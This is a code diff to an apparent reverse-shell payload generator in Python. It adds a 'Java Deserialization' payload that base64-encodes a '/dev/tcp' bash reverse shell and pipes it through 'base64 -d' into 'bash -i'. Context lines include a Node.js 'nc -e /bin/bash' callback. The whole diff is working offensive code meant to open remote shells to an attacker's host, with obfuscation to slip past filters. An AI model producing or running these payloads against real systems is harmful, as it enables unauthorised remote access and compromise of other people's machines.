@@ -1,3 +1,4 @@
+import base64
 import argparse
 import random
 from argparse import RawTextHelpFormatter
@@ -115,6 +116,11 @@ p.waitFor();
 
 # Node.js bash 16
 '''require('child_process').exec('nc -e /bin/bash {local_host} {local_port}')
+''',
+
+# Java Deserialization Bash 17
+'''
+bash -c {echo,{base_64_rev}}|{base64,-d}|{bash,-i}
 '''
 
 )
@@ -128,6 +134,11 @@ random_ports = (
 
 
 def format_payload(payload, local_host, local_port):
+    if payload == 17:
+        rp = '/bin/bash -c "/bin/sh -i >& /dev/tcp/{local_host}/{local_port} 0>&1"'.replace('{local_host}', local_host).replace('{local_port}', local_port)
+        bs = base64.b64encode(rp.encode())
+        return payloads[17].replace('{base_64_rev}', bs.decode() )
+
     if payload == -1:
         result = []
         for i in range(0, len(payloads)):
